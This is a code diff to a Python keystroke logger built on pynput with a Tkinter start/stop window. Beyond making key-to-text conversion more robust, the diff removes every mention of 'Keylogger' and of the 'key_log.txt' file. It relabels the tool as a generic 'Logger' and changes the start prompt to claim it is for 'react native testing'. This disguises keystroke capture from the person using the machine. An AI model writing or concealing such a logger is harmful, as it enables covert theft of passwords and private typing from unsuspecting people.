@@ -21,20 +21,30 @@ now: _dt = _dt.now()  # Unused, but kept for completeness
 
 def get_key_str(key: _Any) -> str:
     """Convert pynput key to a printable string."""
-    try:
-        return key.char  # For printable chars
-    except AttributeError:
-        return {
-            _keyboard.Key.space: ' ',
-            _keyboard.Key.enter: '\n',
-            _keyboard.Key.tab: '\t',
-            _keyboard.Key.backspace: '[BACKSPACE]',
-            _keyboard.Key.shift: '[SHIFT]',
-            _keyboard.Key.ctrl: '[CTRL]',
-            _keyboard.Key.alt: '[ALT]',
-            _keyboard.Key.cmd: '[CMD]',
-            # Add more as needed
-        }.get(key, str(key))
+    if key is None:
+        return '[unknown]'
+    
+    # Handle KeyCode with char
+    if hasattr(key, 'char') and key.char is not None:
+        return key.char
+    
+    # Fallback for special keys, KeyCode without char, or other
+    special_map = {
+        _keyboard.Key.space: ' ',
+        _keyboard.Key.enter: '\n',
+        _keyboard.Key.tab: '\t',
+        _keyboard.Key.backspace: '[BACKSPACE]',
+        _keyboard.Key.shift: '[SHIFT]',
+        _keyboard.Key.ctrl: '[CTRL]',
+        _keyboard.Key.alt: '[ALT]',
+        _keyboard.Key.cmd: '[CMD]',
+        # Add more Key objects as needed
+    }
+    if isinstance(key, _keyboard.Key):
+        return special_map.get(key, str(key))
+    
+    # For KeyCode without char or other types
+    return str(key)
 
 
 def generate_text_log(key_str: str) -> None:
@@ -89,7 +99,7 @@ def start_keylogger() -> None:
     global is_logging
     is_logging = True
     label.config(
-        text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'"
+        text="[+] Logger is running!\n[!]'"
     )
     start_button.config(state="disabled")
     stop_button.config(state="normal")
@@ -99,7 +109,7 @@ def stop_keylogger() -> None:
     """Stops keystroke logging (toggles flag)."""
     global is_logging
     is_logging = False
-    label.config(text="Keylogger stopped.")
+    label.config(text="Logger stopped.")
     start_button.config(state="normal")
     stop_button.config(state="disabled")
 
@@ -109,9 +119,9 @@ if __name__ == "__main__":
     os.makedirs("./out", exist_ok=True)
 
     root = _Tk()
-    root.title("Keylogger")
+    root.title("Logger")
 
-    label = _Label(root, text='Click "Start" to begin key logging...')
+    label = _Label(root, text='Click "Start" to begin react native testing...')
     label.config(anchor=_CENTER)
     label.pack()
 
